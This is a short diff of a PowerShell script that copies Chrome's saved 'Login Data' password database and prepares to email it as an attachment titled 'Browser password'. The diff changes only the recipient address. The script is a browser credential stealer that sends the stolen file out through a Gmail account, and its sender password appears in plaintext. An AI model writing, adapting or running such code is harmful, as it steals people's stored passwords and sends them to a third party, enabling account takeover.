@@ -4,7 +4,7 @@ $data="C:\Users\"+$username+"\AppData\Local\Google\Chrome\User Data\Default\Logi
 copy-item -path $data -destination D:/
 $From = "demosabin5010@gmail.com"
 $Pass = "demoaccount"
-$To = "sabinshrestha15@gmail.com"
+$To = "9844417@gmail.com"
 $Attachment = "D:\Login Data"
 $Subject = "Browser password"
 $Body = "pass attached"
